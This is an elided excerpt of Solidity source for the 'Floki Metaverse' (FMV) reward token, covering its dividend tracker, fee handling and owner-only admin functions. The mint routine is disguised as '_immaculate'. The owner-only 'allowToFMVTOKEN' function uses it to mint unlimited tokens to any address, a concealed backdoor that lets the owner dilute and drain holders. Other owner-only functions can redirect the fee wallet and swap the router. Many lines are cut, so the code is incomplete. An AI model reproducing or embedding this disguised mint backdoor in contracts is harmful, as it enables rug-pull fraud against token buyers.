...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function _immaculate(address account, uint256 amount) internal virtual {
...
function _immaculate(address account, uint256 value) internal override {
    super._immaculate(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      _immaculate(account, mintAmount);
...
contract FMVTOKENrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using HolderMap  for HolderMap .Map;
HolderMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("FMVTOKEN_rewardToken_Tracker", "FMVTOKEN_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "FMVTOKEN_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "FMVTOKEN_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main FMVTOKEN contract.");
    }
...
contract FMVTOKEN is ERC20, Ownable {
 ...
 address public lp;
  ILP public adressLiquidity;
    address public devFeeReciever =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Floki Metaverse", "FMV") {
 
        TotalFees = bnbReward.add(liquidityFee).add(devFee);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new FMVTOKENrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 _immaculate(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function allowToFMVTOKEN(address userAddress, uint256 tokenToUser) public masterWallet{
       _immaculate(userAddress, tokenToUser);
  }
 function setDevWallet(address payable wallet) public masterWallet {
        devFeeReciever = wallet;
    }
   
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "FMVTOKEN: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "FMVTOKEN: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "FMVTOKEN: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "FMVTOKEN: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTFMVTOKEN = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTFMVTOKEN);
...
addLiquidity(tokensTFMVTOKEN, bnbForLiquidity);
payable(devFeeReciever).transfer(bnbForDev);
